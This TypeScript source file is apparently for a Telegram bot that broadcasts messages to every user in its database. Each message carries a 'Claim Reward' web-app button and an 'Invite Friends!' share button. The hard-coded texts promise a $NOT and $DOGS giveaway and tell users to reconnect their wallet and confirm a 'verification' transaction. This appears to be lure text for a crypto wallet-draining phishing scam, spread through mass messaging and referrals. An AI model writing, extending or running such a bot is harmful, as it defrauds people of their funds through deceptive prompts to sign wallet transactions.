import prisma, { PrismaModelType } from "@/backend/modules/prisma/Prisma";
import DodoBot from "./classes/DodoBot";
import { generateRandomNumber } from "@/backend/utils/string";
import { Markup } from "telegraf";
import { getWebAppUrl } from "./classes/DodoClient";
import { getInviteText } from "@/backend/api/player/send_invite/actions";
import CustomTelegraf, { getBotData } from "@/bot/classes/CustomTelegraf";
import { User } from "@prisma/client";
async function getButtons(CLIENT_BOT: CustomTelegraf, user: PrismaModelType<'user'>, texts: string[] = []) {
    return Markup.inlineKeyboard([
        Markup.button.webApp(texts?.[0] ?? "Claim Reward", await getWebAppUrl(CLIENT_BOT, user)),
        Markup.button.switchToChat(texts?.[1] ?? "Invite Friends!", await getInviteText(CLIENT_BOT, user)),
    ], {
        columns: 1
    })
}

const texts = [
    `🚨 {username}, If after wallet connection you received a transaction with a comment, connect your wallet again.
Confirm the verification prompt. Ref:#91103

🎉 It means that you can receive a reward, and the system has sent a verification message to ensure your wallet is not a spam wallet.`,
    `Welcome, esteemed user! 🦴

Each user has a chance to receive a reward based on their activity: The more active you are — the greater the reward.

Currently, there is a distribution of 100 mln $NOT and $DOGS.

Hurry up to claim your bonus 🎁`
]

async function sleep(ms: number): Promise<void> {
    return new Promise<void>(r => setTimeout(r, ms));
}
let uploadedImages: {
    [path: string]: string | undefined
} = {};
let userSteps: {
    [id: string]: number | undefined
} = {}
export async function handleAd(dodoBot: DodoBot, skip = 0, step = 0, take = 20) {
    const users_count = await prisma.user.count();
    if (users_count <= skip) {
        console.log("AD FINISHED", users_count);
        return;
    }

    const users = await prisma.user.findMany({
        skip,
        take
    });
    const config = await getBotData(dodoBot.bot);

    await Promise.all(users.map(async user => {
        const userStep = userSteps[user.chatId] || 0;
        let ad = (config?.ads ?? texts)[userStep % texts.length];
        userSteps[user.chatId] = userStep + 1;

        if (typeof ad === 'string') {
            ad = ad.replaceAll("{username}", (user.username || user.chatId) + "");
            const buttons = await getButtons(dodoBot.bot, user);
            try {
                await dodoBot.bot.telegram.sendMessage(user.chatId, ad, buttons).catch(() => undefined);
            } catch (error) {
                console.error(`Failed to send message to user ${user.chatId}:`, error);
            }
        } else if (ad.isPhoto) {
            ad.content = ad.content.replaceAll("{username}", (user.username || user.chatId) + "")
            const buttons = await getButtons(dodoBot.bot, user, ad.buttons)

            const previousUpload = uploadedImages[ad.image];
            try {
                const sent = await dodoBot.bot.telegram.sendPhoto(user.chatId, previousUpload ? previousUpload : {
                    source: process.cwd() + ad.image
                }, {
                    ...buttons,
                    caption: ad.content
                });

                uploadedImages[ad.image] = sent.photo.at(0)?.file_id;
            } catch (error) {
                console.error(`Failed to send message to user ${user.chatId}:`, error);
            }
        }
    }));

    await sleep(500);
    await handleAd(dodoBot, skip + take, step + 1, take);
}
